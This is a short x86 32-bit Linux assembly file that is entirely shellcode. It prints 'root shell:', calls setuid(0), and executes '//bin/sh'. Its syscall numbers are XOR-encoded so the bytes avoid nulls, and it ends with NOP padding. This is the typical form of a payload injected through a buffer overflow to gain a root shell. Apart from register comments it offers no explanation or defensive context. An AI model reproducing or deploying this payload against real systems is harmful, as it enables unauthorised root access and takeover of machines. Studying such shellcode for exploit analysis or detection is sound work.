.data

.text

.global _start

_start:

# 72 6f 6f 74 20 73 68 65 6c 6c 3a 0a
#  r  o  o  t     s  h  e  l  l  : \n
    movl    $0x0a3a6c6c, %eax
    push    %eax
    movl    $0x65687320, %eax
    push    %eax
    movl    $0x746f6f72, %eax
    push    %eax
# sys_write:
#   %eax  %ebx  %ecx  %edx
#    4     fd    buf   size
    movl    $0xfffffffc, %edx
    xor     $0xfffffff0, %edx
    movl    %esp, %ecx
    movl    $0xfffffff1, %ebx
    xor     $0xfffffff0, %ebx
    movl    $0xfffffff4, %eax
    xor     $0xfffffff0, %eax
    int     $0x80

# sys_setuid:
#   %eax  %ebx
#    23    uid
    xor     %ebx, %ebx
    movl    $0xffffff07, %eax
    xor     $0xffffff10, %eax
    int     $0x80

# 2f 2f 62 69 6e 2f 73 68 00
#  /  /  b  i  n  /  s  h
    xor     %eax, %eax
    push    %eax
    push    $0x68732f6e
    push    $0x69622f2f
# sys_execve:
#   %eax  %ebx  %ecx  %edx
#    11    file  argv  envp
    movl    %esp, %ebx
    movl    %eax, %ecx
    movl    %eax, %edx
    movl    $0xfffffffb, %eax
    xor     $0xfffffff0, %eax
    int     $0x80

# sys_exit:
#   %eax  %ebx
#    1     code
    xor     %ebx, %ebx
    movl    $0xfffffff1, %eax
    xor     $0xfffffff0, %eax
    int     $0x80

# NOP (27 bytes)
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
